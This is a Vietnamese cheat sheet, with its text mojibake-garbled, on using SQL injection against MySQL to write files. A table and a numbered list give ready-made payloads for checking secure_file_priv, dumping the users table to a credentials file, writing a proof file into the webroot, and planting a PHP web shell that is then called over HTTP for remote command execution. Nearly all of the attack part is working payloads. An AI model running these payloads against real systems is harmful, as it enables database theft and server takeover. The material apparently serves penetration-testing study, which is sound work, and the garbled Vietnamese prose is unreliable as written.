| **Step**                      | **Query / Payload**                                                                                                                                                                | **Th√¥ng tin thu ƒë∆∞·ª£c / H√†nh ƒë·ªông**                             | **√ù nghƒ©a**                                                                                                                                            |
| ----------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1Ô∏è‚É£ Ki·ªÉm tra quy·ªÅn ghi file   | `SHOW VARIABLES LIKE 'secure_file_priv'; ' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -` | Gi√° tr·ªã c·ªßa bi·∫øn `secure_file_priv` (empty / th∆∞ m·ª•c c·ª• th·ªÉ / NULL) | X√°c ƒë·ªãnh c√≥ th·ªÉ ghi file ·ªü ƒë√¢u: <br>- Empty ‚Üí ghi b·∫•t k·ª≥ ƒë√¢u <br>- `/var/lib/mysql-files` ‚Üí ch·ªâ ghi ƒë∆∞·ª£c trong th∆∞ m·ª•c n√†y <br>- NULL ‚Üí kh√¥ng ghi ƒë∆∞·ª£c |
| 2Ô∏è‚É£ Xu·∫•t d·ªØ li·ªáu ra file      | `SELECT * FROM users INTO OUTFILE '/tmp/credentials';`                                                                                                                        | Ghi to√†n b·ªô b·∫£ng `users` ra file `/tmp/credentials`                 | D√πng ƒë·ªÉ xu·∫•t d·ªØ li·ªáu DB th√†nh file tr√™n server                                                                                                         |
| 3Ô∏è‚É£ Ghi chu·ªói t√πy √Ω ra file   | `SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`                                                                                                                       | T·∫°o file text ch·ª©a chu·ªói ‚Äúthis is a test‚Äù                           | Ki·ªÉm ch·ª©ng c√≥ quy·ªÅn ghi file                                                                                                                           |
| 4Ô∏è‚É£ Payload ghi file qua SQLi | `' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -`                                                                                | Ghi chu·ªói v√†o file `proof.txt` trong webroot                        | Ki·ªÉm tra c√≥ th·ªÉ ghi ra webroot kh√¥ng                                                                                                                   |
| 5Ô∏è‚É£ Vi·∫øt web shell            | `' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php'-- -`                                                                         | T·∫°o file `shell.php` trong webroot ch·ª©a PHP webshell                | Cho ph√©p remote command execution (RCE) qua HTTP request, v√≠ d·ª•: `http://SERVER_IP/shell.php?0=id`                                                     |

üîë Ghi nh·ªõ
  ƒêi·ªÅu ki·ªán c·∫ßn ƒë·ªÉ ghi file:
  User DB c√≥ FILE privilege.
  secure_file_priv kh√¥ng set NULL.
  C√≥ quy·ªÅn ghi v√†o th∆∞ m·ª•c target (v√≠ d·ª•: webroot).
  K·ªπ thu·∫≠t: d√πng SELECT ... INTO OUTFILE ƒë·ªÉ ghi d·ªØ li·ªáu ho·∫∑c shell.
  ·ª®ng d·ª•ng th·ª±c t·∫ø: ghi webshell ‚Üí RCE.





1. Ki·ªÉm tra bi·∫øn secure_file_priv ( check xem c√≥ th·ªÉ ƒë·ªçc file ·ªü v·ªã tr√≠ n√†o, n·∫øu k tr·∫£ v·ªÅ g√¨ nghƒ©a l√† b·∫•t k√¨ v·ªã tr√≠ n√†o c≈©ng c√≥ th·ªÉ ƒë·ªçc file )
  ' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -

2. Xu·∫•t d·ªØ li·ªáu b·∫£ng ra file
  SELECT * FROM users INTO OUTFILE '/tmp/credentials';

3. Ghi chu·ªói t√πy √Ω ra file test
  SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

4. Payload SQLi ghi file v√†o webroot
  ' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
    Check ƒë√£ th√†nh c√¥ng ch∆∞a b·∫±ng c√°ch : ' UNION SELECT 1,LOAD_FILE("/var/www/html/proof.txt"),3,4-- -

5. Ghi Web Shell (PHP)
  ' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php'-- -
  http://SERVER_IP/shell.php?0=id

Check secure_file_priv ‚Üí Test ghi file (/tmp) ‚Üí Ghi proof.txt ‚Üí Ghi webshell ‚Üí RCE.
